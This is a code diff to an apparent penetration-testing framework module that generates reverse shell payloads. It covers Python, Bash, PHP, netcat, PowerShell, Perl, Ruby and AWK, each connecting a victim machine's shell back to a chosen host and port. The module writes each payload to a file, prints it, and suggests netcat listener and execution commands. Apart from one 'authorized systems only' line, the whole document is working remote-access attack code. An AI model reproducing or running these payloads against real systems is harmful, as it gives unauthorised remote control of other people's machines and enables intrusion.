@@ -1,5 +1,6 @@
 """
 Reverse Shell Generator - Various programming languages
+FIXED: String literal errors
 """
 
 MODULE_INFO = {
@@ -21,7 +22,7 @@ OPTIONS = {
     },
     "type": {
         "type": "choice",
-        "description": "Reverse Shell type",
+        "description": "Shell type",
         "required": True,
         "choices": ["python", "bash", "php", "netcat", "powershell", "perl", "ruby"],
         "default": "python"
@@ -36,8 +37,9 @@ OPTIONS = {
 
 def generate_python_reverse_shell(lhost, lport):
     """Generate Python reverse shell"""
-    return f'''#!/usr/bin/env python3
+    code = f'''#!/usr/bin/env python3
 import socket,os,pty
+
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("{lhost}",{lport}))
 os.dup2(s.fileno(),0)
@@ -45,29 +47,38 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 pty.spawn("/bin/bash")
 '''
+    return code
 
 def generate_bash_reverse_shell(lhost, lport):
     """Generate Bash reverse shell"""
-    return f'''bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
-'''
+    code = f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
+    return code
 
 def generate_php_reverse_shell(lhost, lport):
     """Generate PHP reverse shell"""
-    return f'''<?php
-exec("/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'");
+    code = f'''<?php
+$sock=fsockopen("{lhost}",{lport});
+exec("/bin/sh -i <&3 >&3 2>&3");
 ?>
 '''
+    return code
 
 def generate_netcat_reverse_shell(lhost, lport):
     """Generate Netcat reverse shell"""
-    return f'''nc -e /bin/bash {lhost} {lport}
-# Alternative:
+    code = f'''# Netcat reverse shell
+nc -e /bin/bash {lhost} {lport}
+
+# Alternative without -e flag:
 # rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f
+
+# Another alternative:
+# nc {lhost} {lport} -e /bin/sh
 '''
+    return code
 
 def generate_powershell_reverse_shell(lhost, lport):
     """Generate PowerShell reverse shell"""
-    return f'''$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
+    code = f'''$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{{0}};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
@@ -80,6 +91,25 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
 }}
 $client.Close();
 '''
+    return code
+
+def generate_perl_reverse_shell(lhost, lport):
+    """Generate Perl reverse shell"""
+    code = f'''perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'
+'''
+    return code
+
+def generate_ruby_reverse_shell(lhost, lport):
+    """Generate Ruby reverse shell"""
+    code = f'''ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{lhost}",{lport});while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'
+'''
+    return code
+
+def generate_awk_reverse_shell(lhost, lport):
+    """Generate AWK reverse shell"""
+    code = f'''awk 'BEGIN {{s = "/inet/tcp/0/{lhost}/{lport}"; while(1) {{ do{{ printf "shell> " |& s; s |& getline c; if(c) {{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}'
+'''
+    return code
 
 def run(session, options):
     lhost = options.get("lhost", "192.168.1.100")
@@ -96,7 +126,7 @@ def run(session, options):
     print(f"[*] LPORT: {lport}")
     print("-" * 60)
     
-    # Generate shell
+    # Generate shell based on type
     if shell_type == "python":
         content = generate_python_reverse_shell(lhost, lport)
         ext = ".py"
@@ -113,34 +143,63 @@ def run(session, options):
         content = generate_powershell_reverse_shell(lhost, lport)
         ext = ".ps1"
     elif shell_type == "perl":
-        content = f'''perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};''''
+        content = generate_perl_reverse_shell(lhost, lport)
         ext = ".pl"
     elif shell_type == "ruby":
-        content = f'''ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{lhost}",{lport});while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end''''
+        content = generate_ruby_reverse_shell(lhost, lport)
         ext = ".rb"
-    
-    # Display or save
-    if output_file:
-        with open(output_file, 'w') as f:
-            f.write(content)
-        print(f"[+] Saved to: {output_file}")
     else:
-        default_name = f"reverse_shell{ext}"
-        with open(default_name, 'w') as f:
+        content = generate_python_reverse_shell(lhost, lport)
+        ext = ".py"
+    
+    # Determine output filename
+    if output_file:
+        final_output = output_file
+    else:
+        final_output = f"reverse_shell_{lhost}_{lport}{ext}"
+    
+    # Save to file
+    try:
+        with open(final_output, 'w') as f:
             f.write(content)
-        print(f"[+] Saved to: {default_name}")
-    
-    print(f"\n[+] Reverse Shell Code:")
-    print("-" * 40)
-    print(content)
-    print("-" * 40)
-    
-    print(f"\n[+] Listener commands:")
-    if shell_type in ["python", "bash", "netcat", "php", "perl", "ruby"]:
-        print(f"    nc -lvnp {lport}")
-    elif shell_type == "powershell":
-        print(f"    nc -lvnp {lport}  # Or use PowerShell listener")
-    
-    print(f"\n[!] Test on authorized systems only!")
-    
-    return True
+        
+        print(f"[+] Reverse shell saved to: {final_output}")
+        print(f"[+] Type: {shell_type.upper()}")
+        print(f"[+] Size: {len(content)} bytes")
+        
+        print(f"\n[+] Reverse Shell Code:")
+        print("=" * 50)
+        print(content)
+        print("=" * 50)
+        
+        print(f"\n[+] Listener commands:")
+        if shell_type in ["python", "bash", "netcat", "php", "perl", "ruby"]:
+            print(f"    nc -lvnp {lport}")
+            print(f"    # Or: ncat -lvp {lport}")
+        elif shell_type == "powershell":
+            print(f"    nc -lvnp {lport}  # Netcat listener")
+            print(f"    # Or use PowerShell listener")
+        
+        print(f"\n[+] Usage examples:")
+        if shell_type == "python":
+            print(f"    python3 {final_output}")
+        elif shell_type == "bash":
+            print(f"    bash {final_output}")
+        elif shell_type == "php":
+            print(f"    php -f {final_output}")
+        elif shell_type == "netcat":
+            print(f"    chmod +x {final_output} && ./{final_output}")
+        elif shell_type == "powershell":
+            print(f"    powershell -File {final_output}")
+        elif shell_type == "perl":
+            print(f"    perl {final_output}")
+        elif shell_type == "ruby":
+            print(f"    ruby {final_output}")
+        
+        print(f"\n[!] Test on authorized systems only!")
+        
+        return True
+        
+    except Exception as e:
+        print(f"[!] Error generating reverse shell: {e}")
+        return False
